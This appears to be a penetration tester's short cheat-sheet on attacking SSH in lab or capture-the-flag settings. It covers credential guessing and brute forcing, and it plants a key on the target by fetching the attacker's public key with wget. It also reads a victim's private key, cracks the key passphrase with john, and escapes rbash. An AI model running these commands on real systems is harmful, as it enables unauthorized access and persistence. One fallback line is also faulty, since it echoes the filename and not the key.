### **Checks**

- [ ] Try easy username-password combinations
- [ ] Check for username enumeration vulnerabilities
- [ ] Check version for vulnerabilities
- [ ] (Only when getting desperate) Try brute force with Hydra, Medusa

Operators Handbook pg 288
#### SSH Enumeration
```bash - kali
ssh $TARGET -p 22
```
#### Generate key upload to victim
Target:
```bash - target
cd ~
```
```bash - target
mkdir .ssh && cd .ssh
```
Kali:
```bash - kali
ssh-keygen
```
```bash - kali
cp /home/kali/.ssh/id_rsa* .
```
![[Python#Server]]
Target:
```bash - target
wget http://$KALI/id_rsa.pub
```
```bash - target
mv id_rsa.pub authorized_keys
```
Grant proper permissions (0700 for **~/.ssh** and 0644 for **~/.ssh/authorized_keys**).
Kali:
```bash - kali
chmod 600 id_rsa
```
```bash - kali
ssh -i id_rsa $USER@$TARGET
```
If that fails, try:
```bash - kali
echo id_rsa.pub > ~/.ssh/authorized_keys
```
Then:
```bash - kali
ssh $USER@$TARGET
```
#### id_rsa
```bash
cat home/user/.ssh/id_rsa
```
copy value to local id_rsa file
```bash
sudo chmod 600 id_rsa
```
```bash
ssh -i id_rsa $USER@$TARGET -p 2222
```
#### Disable login scripts
```bash - kali
ssh $USER@$TARGET -t 'bash --noprofile'
```
#### ssh2john keyphrase
```bash
locate ssh2john
```
```bash
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```
```python
python3 /usr/share/john/ssh2john.py id_rsa > key.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
```
#### [Error] no matching host key exchange type found.
```bash - kali
ssh $TARGET -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc -p 22
```
```bash - kali
ssh $TARGET -oHostKeyAlgorithms=+ssh-dss -p 22
```
#### Escaping from rbash
```bash
ssh user@$TARGET -t "bash --noprofile"
```

